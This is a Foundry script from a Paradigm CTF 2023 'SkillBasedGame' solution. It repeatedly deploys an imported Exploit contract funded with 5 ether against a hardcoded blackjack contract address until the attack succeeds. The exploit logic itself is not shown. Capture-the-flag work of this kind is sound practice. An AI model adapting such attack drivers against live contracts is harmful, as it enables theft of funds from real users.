// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";
import {Challenge} from "./challenge/Challenge.sol";
import {Exploit} from "./Exploit.sol";

// forge script src/ParadigmCTF2023/SkillBasedGame/Exploit.s.sol:ExploitScript --private-key $PRIVATE_KEY --broadcast

contract ExploitScript is Script {
    function run() public {
        vm.startBroadcast();

        address BLACKJACK = 0xA65D59708838581520511d98fB8b5d1F76A96cad;

        for (uint256 i = 0; i < 10; i++) {
            try new Exploit{value: 5 ether}(BLACKJACK).exploit() { break; } catch {}
        }

        // address challengeAddr = 0xE131b29fF972FBe2448Dd46959cFf198b24FC25D;
        // require(Challenge(challengeAddr).isSolved());

        vm.stopBroadcast();
    }
}
